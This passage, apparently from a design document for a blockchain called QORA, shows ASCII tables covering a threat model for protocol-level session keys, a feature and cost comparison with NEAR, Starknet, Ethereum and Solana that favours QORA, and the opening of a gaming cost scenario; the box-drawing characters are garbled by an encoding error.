â”‚  â”‚ signing           â”‚                     â”‚ hardware chip)          â”‚     â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤     â”‚
â”‚  â”‚ UI manipulation   â”‚ TOTAL LOSS          â”‚ Limited by permissions  â”‚     â”‚
â”‚  â”‚ (fake tx display) â”‚ (sign malicious tx) â”‚ Even if tricked, damage â”‚     â”‚
â”‚  â”‚                   â”‚                     â”‚ capped at limits        â”‚     â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Threat Analysis

### Comprehensive Threat Model

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                           THREAT MODEL MATRIX                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  THREAT                     LIKELIHOOD    IMPACT     MITIGATION            â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    â”‚
â”‚                                                                             â”‚
â”‚  1. Session key theft       MEDIUM        LOW        Permission limits,    â”‚
â”‚     from browser storage                             auto-expiry, single-  â”‚
â”‚                                                      use keys              â”‚
â”‚                                                                             â”‚
â”‚  2. Replay attacks          LOW           LOW        Nonce tracking,       â”‚
â”‚     (reuse old tx)                                   blockchain consensus  â”‚
â”‚                                                                             â”‚
â”‚  3. Permission bypass       VERY LOW      HIGH       Consensus-level       â”‚
â”‚     attempt                                          enforcement, not      â”‚
â”‚                                                      smart contract        â”‚
â”‚                                                                             â”‚
â”‚  4. Validator collusion     VERY LOW      HIGH       Decentralized         â”‚
â”‚                                                      validator set,        â”‚
â”‚                                                      staking slashing      â”‚
â”‚                                                                             â”‚
â”‚  5. DoS via session         LOW           MEDIUM     Rate limiting on      â”‚
â”‚     key creation                                     creation, storage     â”‚
â”‚                                                      fees                  â”‚
â”‚                                                                             â”‚
â”‚  6. Social engineering      MEDIUM        LOW        Limited damage even   â”‚
â”‚     (trick user to sign                              if successful         â”‚
â”‚     bad session)                                                           â”‚
â”‚                                                                             â”‚
â”‚  7. Time manipulation       VERY LOW      MEDIUM     Block time from       â”‚
â”‚     attacks                                          consensus, not        â”‚
â”‚                                                      client                â”‚
â”‚                                                                             â”‚
â”‚  8. Storage exhaustion      LOW           LOW        Pruning expired       â”‚
â”‚                                                      keys, storage fees    â”‚
â”‚                                                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  RISK HEAT MAP                                                              â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•                                                              â”‚
â”‚                                                                             â”‚
â”‚              â”‚                                                              â”‚
â”‚        HIGH  â”‚                    â”Œâ”€â”€â”€â”                                     â”‚
â”‚              â”‚                    â”‚ 3 â”‚  4                                  â”‚
â”‚              â”‚                    â””â”€â”€â”€â”˜                                     â”‚
â”‚    I         â”‚                                                              â”‚
â”‚    M  MEDIUM â”‚        â”Œâ”€â”€â”€â”                  â”Œâ”€â”€â”€â”                          â”‚
â”‚    P         â”‚        â”‚ 5 â”‚                  â”‚ 7 â”‚                          â”‚
â”‚    A         â”‚        â””â”€â”€â”€â”˜                  â””â”€â”€â”€â”˜                          â”‚
â”‚    C         â”‚                                                              â”‚
â”‚    T    LOW  â”‚ â”Œâ”€â”€â”€â”  â”Œâ”€â”€â”€â”                  â”Œâ”€â”€â”€â”                          â”‚
â”‚              â”‚ â”‚ 8 â”‚  â”‚ 1 â”‚  6               â”‚ 2 â”‚                          â”‚
â”‚              â”‚ â””â”€â”€â”€â”˜  â””â”€â”€â”€â”˜                  â””â”€â”€â”€â”˜                          â”‚
â”‚              â”‚                                                              â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€               â”‚
â”‚                LOW        MEDIUM        HIGH       VERY HIGH                â”‚
â”‚                                                                             â”‚
â”‚                            LIKELIHOOD                                       â”‚
â”‚                                                                             â”‚
â”‚  LEGEND: Numbers correspond to threats listed above                        â”‚
â”‚          All high-impact threats have VERY LOW likelihood                  â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Comparative Analysis

### Session Keys: Blockchain Comparison

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    SESSION KEYS: BLOCKCHAIN COMPARISON                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚                    QORA      NEAR     STARKNET   ETHEREUM   SOLANA          â”‚
â”‚                  (Ours)   (Native)   (AA)      (ERC-4337)  (None)          â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•  â”‚
â”‚                                                                             â”‚
â”‚  IMPLEMENTATION                                                             â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                             â”‚
â”‚  Protocol-level    âœ…        âœ…         âŒ          âŒ         âŒ           â”‚
â”‚  Smart contract    âŒ        âŒ         âœ…          âœ…         âŒ           â”‚
â”‚  No implementation âŒ        âŒ         âŒ          âŒ         âœ…           â”‚
â”‚                                                                             â”‚
â”‚  FEATURES                                                                   â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€                                                                   â”‚
â”‚  Single-use keys   âœ…        âŒ         âŒ          âŒ         âŒ           â”‚
â”‚  Auto-delete       âœ…        âŒ         âŒ          âŒ         âŒ           â”‚
â”‚  Spending limits   âœ…        âš ï¸ (gas)   âœ…          âœ…         âŒ           â”‚
â”‚  Time expiry       âœ…        âŒ         âœ…          âœ…         âŒ           â”‚
â”‚  Recipient limits  âœ…        âŒ         âœ…          âœ…         âŒ           â”‚
â”‚  Contract limits   âœ…        âœ…         âœ…          âœ…         âŒ           â”‚
â”‚  Method limits     âœ…        âœ…         âœ…          âœ…         âŒ           â”‚
â”‚  Uses remaining    âœ…        âŒ         âŒ          âŒ         âŒ           â”‚
â”‚                                                                             â”‚
â”‚  COSTS                                                                      â”‚
â”‚  â”€â”€â”€â”€â”€                                                                      â”‚
â”‚  Create session    ~$0.001   ~$0.001   ~$0.01     ~$5-50     N/A           â”‚
â”‚  Use session       ~$0.001   ~$0.001   ~$0.01     ~$1-5      N/A           â”‚
â”‚  Overhead vs       0%        0%        ~50%       500-1000%  N/A           â”‚
â”‚  normal tx                                                                  â”‚
â”‚                                                                             â”‚
â”‚  SECURITY                                                                   â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€                                                                   â”‚
â”‚  Consensus-level   âœ…        âœ…         âŒ          âŒ         âŒ           â”‚
â”‚  enforcement                                                                â”‚
â”‚  Smart contract    N/A       N/A       Possible   Possible   N/A           â”‚
â”‚  bugs possible                                                              â”‚
â”‚  Upgrade risk      Low       Low       Medium     Medium     N/A           â”‚
â”‚                                                                             â”‚
â”‚  WEBAUTHN SUPPORT                                                           â”‚
â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                            â”‚
â”‚  P-256 signatures  âœ…        âŒ         âœ…          âš ï¸         âŒ           â”‚
â”‚                   (native)            (native)   (precompile)              â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Visual Feature Comparison

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                         FEATURE COMPARISON CHART                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SINGLE-USE KEYS                                                            â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  NEAR      â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Starknet  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Ethereum  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚                                                                             â”‚
â”‚  AUTO-DELETE ON EXHAUSTION                                                  â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  NEAR      â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Starknet  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Ethereum  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚                                                                             â”‚
â”‚  SPENDING LIMITS                                                            â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Per-tx + totalâ”‚
â”‚  NEAR      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘   40%  âš ï¸  Gas only    â”‚
â”‚  Starknet  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  Ethereum  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚                                                                             â”‚
â”‚  RECIPIENT RESTRICTIONS                                                     â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  NEAR      â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚  Starknet  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  Ethereum  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Full support â”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚                                                                             â”‚
â”‚  PROTOCOL-LEVEL (NO EXTRA GAS)                                              â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Native       â”‚
â”‚  NEAR      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  âœ… Native       â”‚
â”‚  Starknet  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Smart contractâ”‚
â”‚  Ethereum  â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Smart contractâ”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%  âŒ Not supportedâ”‚
â”‚                                                                             â”‚
â”‚  OVERALL SCORE                                                              â”‚
â”‚  QORA       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  100%  ğŸ† BEST         â”‚
â”‚  NEAR      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘   50%                  â”‚
â”‚  Starknet  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘   75%                  â”‚
â”‚  Ethereum  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘   65%  (but expensive)â”‚
â”‚  Solana    â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘    0%                  â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Cost Analysis

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      COST ANALYSIS: 1000 GAME TRANSACTIONS                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SCENARIO: User plays a blockchain game with 1000 actions                   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  ETHEREUM (ERC-4337)                                                â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Deploy smart wallet:           $20.00                              â”‚   â”‚
â”‚  â”‚  Create session key:             $5.00                              â”‚   â”‚
â”‚  â”‚  1000 transactions Ã— $2.00:  $2,000.00                              â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                              â”‚   â”‚
â”‚  â”‚  TOTAL:                      $2,025.00                              â”‚   â”‚
